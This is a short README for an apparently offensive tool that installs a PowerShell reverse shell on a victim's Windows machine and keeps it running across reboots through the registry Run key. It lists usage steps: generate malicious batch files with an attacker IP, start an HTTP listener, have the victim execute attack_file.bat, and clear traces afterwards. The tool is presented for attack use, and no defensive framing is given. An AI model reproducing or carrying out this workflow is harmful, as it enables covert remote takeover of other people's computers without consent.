# Auto Start Powershell Reverse shell
auto start the shell by modifying the registry run key

## Example Usage
1. attacker end<br>
    generate malicous files and start the listener<br>
    python3 gen_bat.py attackerIP <br>
    sudo python3 reverse_http_server.py<br>
    <br>
2. victim end<br>
    execute attack_file.bat<br>
    <br>
3. remove the malicious script on victim's computer<br>
    execute clear.bat

